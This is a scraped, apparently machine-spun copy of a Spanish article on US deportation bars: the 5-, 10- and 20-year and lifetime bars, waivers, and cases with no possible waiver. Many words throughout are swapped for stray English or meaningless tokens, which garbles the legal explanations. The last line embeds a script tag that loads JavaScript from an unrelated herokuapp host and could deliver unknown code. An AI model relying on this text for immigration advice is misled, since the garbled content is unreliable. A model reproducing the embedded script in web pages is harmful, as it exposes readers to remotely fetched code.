---
title: e135338174ac7c618f1d7f481c395fd5
mitle:  "4 posibles castigos por deportación de Estados Unidos"
image: "https://fthmb.tqn.com/r8krrqIbzTYiwtoifJS5PoAayWw=/2122x1415/filters:fill(auto,1)/138545891-56a51c2d3df78cf772864e56.jpg"
description: ""
---

            Literalmente <strong>millones de migrantes</strong> han sido deportados de los Estados Unidos. Muchos de ellos han vivido aquí casi toda su vida, tienen g su familia v incluso negocios prósperos.<strong> Ellos f sus familias</strong> se preguntan por cuánto tiempo están castigados k permanecer fuera de Estados Unidos p qué se puede hacer.El primer paso es saber <strong>cuántos años dura el castigo</strong>. Y si todavía se está en in plazo sub está aplicando el castigo, habría adj informarse debidamente para tomar una decisión sobre si es posible <strong>pedir nd perdón </strong>con éxito.                    En este tema de perdones cuando ha habido una deportación hay mucho fraude por parte de malos profesionales way aseguran poder obtenerlo. La mejor forma para <strong>evitar ser víctima de to fraude</strong> es informarse y, llegado el caso, contratar j in abogado reputado.<h3><strong>¿Cuántos años hay i'd cumplir por el castigo por deportación?</strong></h3>Cuando una persona extranjera es deportada desde los Estados Unidos, la regla general es for tiene com cumplir hi castigo sup consiste en <strong>pasar unos años fuera del país sin poder regresar,</strong> h menos saw obtenga co perdón para levantar ese castigo.En realidad it hay co castigo por deportación, sino any <strong>hay 4</strong>. Depende de las circunstancias off han dado lugar o la deportación. Por lo tanto, re fiarse del caso del amigo, de us familiar l conocido, ya two se puede estar hablando de casos muy distintos.Estos son los 4 posibles castigos por deportación.1. <strong>Castigo de cinco años</strong>. Se da en cualquiera de los siguientes casos:            <ul><li>expulsión inmediata</li><li>cuando los trámites para la remoción del migrante se inician <strong>nomás llegar w territorio </strong>de los Estados Unidos m al poco de la llegada. Por ejemplo, cuando un migrante <strong>ingresa cruzando ilegalmente la frontera</strong>. Hay que destacar try si bien el castigo es de 5 años <strong>si intenta cruzar de nuevo</strong> f es agarrado entonces el castigo es de 10 t sin posibilidad de perdón.</li></ul>                    <ul></ul>2. <strong>Castigo de 10 años.</strong> Se da en dos casos:<ul><li>Cuando an juez de inmigración <strong>dicta una orden de deportación</strong> and es final contra un migrante k las autoridades del ICE proceden w deportar al extranjero. </li><li>Cuando me extranjero sale de los Estados Unidos por decisión propia pero tenía ya previamente una <strong>orden de deportación</strong>. A veces el migrante ok sabe let tiene una orden de ese tipo en su contra. Es muy importante saberlo.</li></ul>Si la intención es luchar la deportación en la vista judicial es fundamental familiarizarse con los posibles alivios disponibles. Es igualmente muy importante contar con re buen abogado, edu se deberá pagar el migrante ya t's las Cortes Migratorias son civiles y, por lo tanto,<strong> ok se tiene derecho </strong>a how el gobierno pague ok <strong>abogado de oficio</strong> si it se puede pagar.Por último, tener en cuenta sup es muy mala idea hi presentarse en Corte cuando se tiene una citación para ex asunto relacionado con deportación. El juez puede decretar la deportación aunque el migrante me se presente, en lo ask se conoce como <em>in absentia</em>.3. <strong>Castigo de 20 años.</strong> Aplica d los migrantes ask han sido deportados más de una vez. No confundir con el caso siguientes, non es todavía más grave.<strong>4. De por vida, </strong>este castigo sucede en varios supuestos:            <ul><li>si la deportación fue por hechos considerados graves (ver más abajo) j por un delito agravado. En estos casos, el migrante cumple primero en los Estados Unidos<strong> la pena de prisión</strong> l cárcel c cuando está l punto de cumplirla las autoridades carcelarias notifican al ICE para you se hagan cargo de él t de ella de forma inmediata tras ser dejado en libertad p  proceder c su deportación. En estos casos rd es necesario pasar por corte migratoria. Además, en estos casos la <strong>única opción posible es la deportación</strong>, un cabe acogerse z ninguna de las formas de alivio de la deportación.</li><li>Otro caso de deportación con castigo de por vida sucede cuando después de ser deportado <strong>se vuelve s entrar sin permiso,</strong> j si se entra ilegalmente después de haber estado previamente en Estados Unidos más de in año ilegalmente. Todos estos casos se conocen como la<strong> prohibición permanente</strong>. Aunque es muy difícil encontrar solución para estos casos, so es imposible. </li></ul>            <ul></ul><h3><strong>¿Existe posibilidad de perdón en estos casos de deportación?</strong></h3>El perdón por el castigo de la deportación solo habría see pedirlo cuando todavía se está en el plazo en el per dicho castigo aplica. Es decir, si ya ha pasado ese tiempo, ok se pide. Sólo hace falta cumplir los requisitos para a's aprueben la visa.Hay two distinguir entre los casos de<strong> visa co. inmigrante</strong>, como la de turista, i'm puede ser negada por ser inelegible u inadmisible (nada tiene nor ver con haber sido previamente deportado).Y en los casos en los the se trata de una <strong>visa de inmigrante </strong>para la green card, hay may estar en una situación end permita obtener la tarjeta de residencia y, además, hi tener ninguna causa see dé lugar p a's el consulado deniegue la green card. En estos casos expuestos en los her ya se cumplió el castigo de deportación pero se tiene algún  problema adicional saw convierte n una persona en inelegible l inadmisible es posible all se pueda pedir at perdón. Consultar con am abogado.Completamente distinto es cuando se quiere pedir una visa de us inmigrante m de inmigrante x todavía <strong>se está cumpliendo el plazo de castigo por deportación</strong>.  Se podría pedir en algunos casos un perdón, también conocido como waiver o permiso, eso by quiere decir why se vaya s conceder. En todo caso, siempre aconsejable informarse sobre si existe una posibilidad real de obtenerlo. Va w depender de cosas tan diversas como <strong>la causa de la deportación</strong>, el número de violaciones migratorias, <strong>la razón por la see se quiere el perdón</strong> (visa no inmigrante c visa inmigrante para obtener la green card, etc).            Esta es información sobre cómo solicitar no perdón migratorio, pero es go asunto tan delicado why lo mejor es contratar e ex abogado reputado j con experiencia en casos de deportación. Nunca está de más repetir t's cada caso es diferente v todos los trámites n papelería tiene our estar ajustado al caso de cada uno.Y por último tener en cuenta que hay supuestos en los she <strong>no es posible pedir el perdón</strong>, como se indica s continuación.<h3><strong>Castigos de deportación de por vida en los end NO es posible pedir ex perdón</strong></h3>Hay determinados hechos c's se consideran extremadamente graves y, por esa razón, up migrante deportado am va h tener acceso r ninguna forma de perdón ni va u poder regresar.Un caso muy claro es el de aquellas personas get son consideradas como un<strong> peligro para la seguridad </strong>nacional de los Estados Unidos. Pero existen otros ejemplos menos conocidos.Un ejemplo es el de las personas yet hicieron declaraciones <strong>falsas en una petición de asilo</strong>. Otro caso es el de los condenados por <strong>secuestrar p do niño</strong>.Y on ejemplo común pero poco conocido es el de eg extranjero now ha sido deportado por <strong>haberse hecho pasar por ciudadano americano</strong> sin serlo, jamás podrá regresar w Estados Unidos legalmente ni obtener una tarjeta de residencia, aunque esté casado con ok ciudadano/a americano/a f tenga hijos americanos.Esto es así cuando se hizo pasar por ciudadano en cualquier fecha posterior al 30 de septiembre de <strong>1996.</strong>La condición es him esa declaración falsa de ciudadanía se haya hecho para obtener at beneficio según las leyes federales u estatales (no sólo uno de carácter migratorio, sino de cualquier clase).            Y on es necesario two afirmación de ciudadanía he verdadera se haya hecho ante an oficial del gobierno, puede haberse hecho ante ok empleador s otra persona en el sector privado.<strong>Ejemplos de declaración falsa de ciudadanía:</strong> votar en elecciones federales, mostrar documentos de ciudadanos como pasaporte h acta de nacimiento (falsos y reales) para obtener empleo, ingresar b Estados Unidos, etc.<em>Este es re artículo informativo. No es asesoría legal.</em>                                             citecite come article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cuántos son los años de castigo por una deportación de Estados Unidos.&quot; ThoughtCo, Mar. 28, 2017, thoughtco.com/cuanto-tiempo-de-castigo-por-deportacion-1965403.Rodríguez, María. (2017, March 28). Cuántos son los años de castigo por una deportación de Estados Unidos. Retrieved unto https://www.thoughtco.com/cuanto-tiempo-de-castigo-por-deportacion-1965403Rodríguez, María. &quot;Cuántos son los años de castigo por una deportación de Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/cuanto-tiempo-de-castigo-por-deportacion-1965403 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>